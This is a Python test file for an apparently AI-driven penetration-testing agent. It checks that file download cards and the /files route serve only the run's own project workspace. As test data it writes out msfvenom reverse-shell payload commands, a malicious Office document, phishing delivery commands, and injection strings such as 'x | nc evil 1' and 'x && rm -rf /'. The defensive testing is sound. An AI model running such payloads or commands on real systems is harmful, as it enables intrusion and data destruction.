"""The chat's download card reads only the run's project workspace (4.9 review, finding 6).

The webapp's /api/agent/files route takes a projectId the caller may read and a path
under that project's `/workspace/<projectId>/`, and calls the agent's /workspace/download.
So the agent must:

- offer a download card (file_ready) only for a file it wrote into the run's own
  project workspace, naming that project; a file under the shared sandbox's /tmp, in
  another project's workspace, or behind a `..` segment gets no card;
- serve /files only from the named project's workspace: no /tmp, no other project, no
  traversal, no symlink escape, and never through a shell.

tests/fixtures/download_card/owner_card.json ties both sides: the webapp's
FileDownloadCard.route.test.tsx sends the same card through the real route.

Runs in the agent image: ./agentic/run_tests.sh tests/test_download_card_workspace.py
"""
from __future__ import annotations

import asyncio
import json
import os
import shutil
import sys
import tempfile
import unittest
from contextlib import asynccontextmanager
from pathlib import Path
from unittest import mock
from unittest.mock import AsyncMock, MagicMock

_AGENTIC = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(_AGENTIC))

from fastapi.testclient import TestClient  # noqa: E402

with mock.patch.dict(os.environ, {"INTERNAL_API_KEY": "download-card-test-master"}):
    @asynccontextmanager
    async def _no_lifespan(_app):
        yield

    with mock.patch("api.lifespan", _no_lifespan):
        import api  # noqa: E402

import workspace_fs  # noqa: E402
from llm_guard import require_configured_master_auth  # noqa: E402
from orchestrator_helpers.streaming import detect_generated_file, emit_streaming_events  # noqa: E402

CARD = json.loads((_AGENTIC.parent / "tests" / "fixtures" / "download_card" / "owner_card.json").read_text())
PID = CARD["project_id"]


def _step(command: str, output: str, tool: str = "kali_shell") -> dict:
    return {"tool_name": tool, "tool_args": {"command": command}, "tool_output": output,
            "output_analysis": "", "success": True}


class AgentOffersCardsOnlyForItsProjectWorkspace(unittest.TestCase):
    def test_the_owner_card_names_the_file_and_its_project(self):
        self.assertEqual(detect_generated_file(CARD["step"], PID), CARD["file_ready"])

    def test_msfvenom_into_the_workspace(self):
        path = f"/workspace/{PID}/notes/shell.elf"
        info = detect_generated_file(_step(f"msfvenom -p linux/x64/shell_reverse_tcp -f elf -o {path}",
                                           f"Saved as: {path}"), PID)
        self.assertEqual(info["filepath"], path)
        self.assertEqual(info["filename"], "shell.elf")
        self.assertEqual(info["projectId"], PID)

    def test_a_fileformat_document_copied_into_the_workspace(self):
        path = f"/workspace/{PID}/notes/malicious.docm"
        info = detect_generated_file(_step(f"cp ~/.msf4/local/malicious.docm {path} && ls -la {path}",
                                           f"-rw-r--r-- 1 root root 31337 Nov 13 12:00 {path}"), PID)
        self.assertEqual(info["filepath"], path)
        self.assertEqual(info["source"], "fileformat")
        self.assertEqual(info["projectId"], PID)

    def test_a_tool_that_says_it_saved_into_the_workspace(self):
        path = f"/workspace/{PID}/notes/report.pdf"
        info = detect_generated_file(_step("python3 make_report.py", f"Saved to {path}.",
                                           tool="execute_code"), PID)
        self.assertEqual(info["filepath"], path)
        self.assertEqual(info["filename"], "report.pdf")

    def test_no_card_for_a_file_outside_the_project_workspace(self):
        cases = {
            "the shared sandbox /tmp": "/tmp/payload.exe",
            "another project's workspace": "/workspace/proj-other/notes/payload.exe",
            "a parent segment": f"/workspace/{PID}/../proj-other/notes/payload.exe",
            "a parent segment deeper": f"/workspace/{PID}/notes/../../proj-other/payload.exe",
            "the workspace root itself": f"/workspace/{PID}/",
            "a directory": f"/workspace/{PID}/notes/",
            "an unexpanded variable": f"/workspace/{PID}/notes/$F",
        }
        for name, path in cases.items():
            with self.subTest(name):
                base = os.path.basename(path.rstrip("/")) or path
                self.assertIsNone(detect_generated_file(
                    _step(f"msfvenom -p x -f exe -o {path}", f"Saved as: {path}\n{base}"), PID))
                self.assertIsNone(detect_generated_file(
                    _step("python3 x.py", f"Saved to {path}", tool="execute_code"), PID))

    def test_a_tmp_output_before_a_workspace_one_does_not_hide_it(self):
        path = f"/workspace/{PID}/notes/payload.exe"
        info = detect_generated_file(
            _step(f"curl -s -o /tmp/probe.body http://192.0.2.10/ ; msfvenom -p x -f exe -o {path}",
                  f"Saved as: {path}"), PID)
        self.assertEqual(info["filepath"], path)

    def test_no_card_without_the_run_project(self):
        self.assertIsNone(detect_generated_file(CARD["step"], ""))
        self.assertIsNone(detect_generated_file(CARD["step"], None))

    def test_no_card_when_the_tool_failed(self):
        step = dict(CARD["step"], tool_output="[ERROR] msfvenom: invalid payload\n")
        self.assertIsNone(detect_generated_file(step, PID))


class PromptsSendDownloadsIntoTheWorkspace(unittest.TestCase):
    """The agent writes a file for the person where a card can serve it."""

    def test_the_workspace_rules_name_the_project_notes_folder_for_downloads(self):
        from prompts import base
        with mock.patch.object(base, "_WORKSPACE_ROOT_FOR_PROMPT", Path("/workspace")):
            rules = base.build_workspace_rules_block(PID)
        self.assertIn("FILES FOR THE USER TO DOWNLOAD", rules)
        self.assertIn(f"-o /workspace/{PID}/notes/payload.exe", rules)
        self.assertIn("cannot be downloaded from the chat", rules)

    def test_the_phishing_skill_writes_no_deliverable_under_tmp(self):
        from prompts.phishing_social_engineering_prompts import PHISHING_SOCIAL_ENGINEERING_TOOLS as text
        self.assertNotIn("-o /tmp/", text)
        self.assertNotRegex(text, r"cp \S+ /tmp/")
        self.assertNotIn("| `/tmp/", text)

    def test_every_phishing_delivery_command_gets_a_card(self):
        """The skill's own commands, filled in as the agent would, produce a card."""
        import re
        from prompts.phishing_social_engineering_prompts import PHISHING_SOCIAL_ENGINEERING_TOOLS as text
        commands = re.findall(r'kali_shell: "([^"]*(?:-o |cp )[^"]*)"', text)
        self.assertGreaterEqual(len(commands), 3, commands)
        for template in commands:
            command = (template.replace("<projectId>", PID).replace("<output_filename>", "payload.exe")
                       .replace("<FILENAME>", "malicious.docm").replace("<filename>", "malicious.docm"))
            name = "payload.exe" if "payload.exe" in command else "malicious.docm"
            with self.subTest(template):
                info = detect_generated_file(_step(command, f"-rw-r--r-- 1 root root 9 {name}"), PID)
                self.assertIsNotNone(info)
                self.assertTrue(info["filepath"].startswith(f"/workspace/{PID}/notes/"))


def _callback() -> MagicMock:
    cb = MagicMock()
    for name in ("on_phase_update", "on_todo_update", "on_approval_request", "on_question_request",
                 "on_tool_complete", "on_execution_step", "on_file_ready", "on_thinking",
                 "on_tool_start", "on_tool_output_chunk", "on_tool_confirmation_request",
                 "on_task_complete"):
        setattr(cb, name, AsyncMock())
    cb._emitted_tool_complete_ids = set()
    cb._emitted_thinking_ids = set()
    cb._emitted_tool_start_ids = set()
    cb._emitted_tool_output_ids = set()
    cb._emitted_approval_key = None
    cb._emitted_question_key = None
    cb._emitted_tool_confirmation_key = None
    return cb


class TheRunEmitsTheCardWithItsProject(unittest.TestCase):
    def _emit(self, state: dict) -> MagicMock:
        cb = _callback()
        asyncio.run(emit_streaming_events(state, cb))
        return cb

    def test_a_completed_step_in_the_workspace_emits_file_ready_with_the_project(self):
        step = dict(CARD["step"], step_id="s1", iteration=1, phase="exploitation")
        cb = self._emit({"project_id": PID, "_completed_step": step, "current_phase": "exploitation"})
        cb.on_file_ready.assert_awaited_once_with(CARD["file_ready"])

    def test_a_step_writing_to_tmp_emits_no_card(self):
        step = _step("msfvenom -p x -f exe -o /tmp/payload.exe", "Saved as: /tmp/payload.exe\npayload.exe")
        step.update(step_id="s2", iteration=1, phase="exploitation")
        cb = self._emit({"project_id": PID, "_completed_step": step, "current_phase": "exploitation"})
        cb.on_tool_complete.assert_awaited()
        cb.on_file_ready.assert_not_awaited()


class _NoShell:
    """An orchestrator whose tool executor fails the test if anything reaches a shell."""

    def __init__(self):
        self.tool_executor = MagicMock()
        self.tool_executor.execute = AsyncMock(side_effect=AssertionError("a download reached kali_shell"))


class FilesServesOnlyTheProjectWorkspace(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix="dl-card-"))
        self._patches = [mock.patch.object(workspace_fs, "WORKSPACE_ROOT", self.tmp),
                         mock.patch.object(api, "orchestrator", _NoShell())]
        for p in self._patches:
            p.start()
        api.app.dependency_overrides[require_configured_master_auth] = lambda: None
        self.client = TestClient(api.app)
        self.root = workspace_fs.resolve_for_project(PID, ".")
        self.payload = b"MZ\x90\x00payload-bytes"
        (self.root / CARD["workspace_relative_path"]).write_bytes(self.payload)
        other = workspace_fs.resolve_for_project("proj-other", ".")
        (other / "notes" / "loot.txt").write_text("other project's loot")

    def tearDown(self):
        api.app.dependency_overrides.pop(require_configured_master_auth, None)
        for p in reversed(self._patches):
            p.stop()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _files(self, path: str, project_id: str = PID):
        params = {"path": path}
        if project_id is not None:
            params["projectId"] = project_id
        return self.client.get("/files", params=params)

    def test_the_card_path_downloads_the_file_as_an_attachment(self):
        r = self._files(CARD["file_ready"]["filepath"], CARD["file_ready"]["projectId"])
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.content, self.payload)
        self.assertIn("attachment", r.headers["content-disposition"])
        self.assertIn("payload.exe", r.headers["content-disposition"])

    def test_a_workspace_relative_path_downloads_too(self):
        r = self._files(CARD["workspace_relative_path"])
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.content, self.payload)

    def test_the_webapp_route_call_serves_the_same_file(self):
        r = self.client.get(CARD["agent_download_path"])
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.content, self.payload)

    def test_no_project_is_refused(self):
        self.assertEqual(self._files(CARD["file_ready"]["filepath"], project_id=None).status_code, 400)
        self.assertEqual(self._files(CARD["file_ready"]["filepath"], project_id="").status_code, 400)

    def test_a_path_outside_the_project_workspace_is_refused(self):
        cases = {
            "the shared sandbox /tmp": "/tmp/payload.exe",
            "an absolute path elsewhere": "/etc/passwd",
            "another project's workspace": "/workspace/proj-other/notes/loot.txt",
            "a parent segment under the project's prefix": f"/workspace/{PID}/../proj-other/notes/loot.txt",
            "a relative parent segment": "notes/../../proj-other/notes/loot.txt",
            "a backslash segment": "notes\\..\\..\\proj-other\\notes\\loot.txt",
            "the agent's own mount": f"{self.tmp}/proj-other/notes/loot.txt",
        }
        for name, path in cases.items():
            with self.subTest(name):
                r = self._files(path)
                self.assertEqual(r.status_code, 403, r.text)
                self.assertNotIn(b"loot", r.content)

    def test_a_project_id_that_climbs_out_is_refused(self):
        for pid in ("../proj-other", "..", "a/b"):
            with self.subTest(pid):
                r = self._files("notes/loot.txt", project_id=pid)
                self.assertEqual(r.status_code, 403)
                self.assertNotIn(b"loot", r.content)

    def test_a_symlink_out_of_the_workspace_is_refused(self):
        os.symlink(self.tmp / "proj-other" / "notes" / "loot.txt", self.root / "notes" / "other-loot")
        os.symlink("/etc/hostname", self.root / "notes" / "host")
        os.symlink(self.tmp / "proj-other", self.root / "notes" / "other-dir")
        for path in ("notes/other-loot", f"/workspace/{PID}/notes/host", "notes/other-dir/notes/loot.txt"):
            with self.subTest(path):
                r = self._files(path)
                self.assertEqual(r.status_code, 403, r.text)
                self.assertNotIn(b"loot", r.content)

    def test_a_missing_file_or_a_directory_answers_404(self):
        self.assertEqual(self._files("notes/nothing-here.exe").status_code, 404)
        self.assertEqual(self._files(f"/workspace/{PID}/notes").status_code, 404)

    def test_shell_metacharacters_never_reach_a_shell(self):
        for payload in ("notes/x; touch /tmp/PWNED", "notes/$(id)", "notes/`id`", "notes/x | nc evil 1",
                        f"/workspace/{PID}/notes/x && rm -rf /"):
            with self.subTest(payload):
                r = self._files(payload)
                self.assertIn(r.status_code, (403, 404))
        api.orchestrator.tool_executor.execute.assert_not_called()


if __name__ == "__main__":
    unittest.main(verbosity=2)
